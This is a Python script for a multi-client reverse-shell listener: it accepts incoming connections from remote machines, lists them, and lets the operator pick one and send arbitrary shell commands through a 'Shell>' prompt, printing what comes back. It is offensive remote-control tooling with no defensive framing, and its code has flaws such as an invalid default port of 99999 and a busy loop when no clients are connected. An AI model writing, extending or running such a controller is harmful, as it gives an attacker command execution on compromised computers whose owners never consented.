import socket
import threading
import sys

clients = []
client_addresses = []

def handle_client(client_socket, address):
    clients.append(client_socket)
    client_addresses.append(address)
    print(f"[+] New connection from {address}")

def start_receiver(listen_ip, listen_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((listen_ip, listen_port))
    server.listen(5)
    print(f"[*] Listening on {listen_ip}:{listen_port}")

    threading.Thread(target=accept_clients, args=(server,)).start()
    command_interface()

def accept_clients(server):
    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr)).start()

def command_interface():
    while True:
        if clients:
            print("\n[+] Active connections:")
            for i, addr in enumerate(client_addresses):
                print(f"{i}: {addr}")
            try:
                selection = int(input("Select a client by number: "))
                if selection < len(clients):
                    interact_with_client(clients[selection])
                else:
                    print("Invalid selection")
            except ValueError:
                print("Please enter a valid number")
        else:
            print("No active connections")

def interact_with_client(client_socket):
    try:
        while True:
            command = input("Shell> ")
            if command.lower() in ['exit', 'quit', 'quit pachirisu']:
                if command.lower() == 'quit pachirisu':
                    print("Returning to client selection...")
                    break
                client_socket.sendall(b'exit')
                break
            if command.strip():
                client_socket.sendall(command.encode('utf-8'))
                response = client_socket.recv(4096)
                print(response.decode('utf-8', errors='ignore'))
    except Exception as e:
        print(f"[-] Exception: {e}")

if __name__ == "__main__":
    if len(sys.argv) == 3:
        listen_ip = sys.argv[1]
        listen_port = int(sys.argv[2])
    else:
        listen_ip = "0.0.0.0"
        listen_port = 99999

    start_receiver(listen_ip, listen_port)
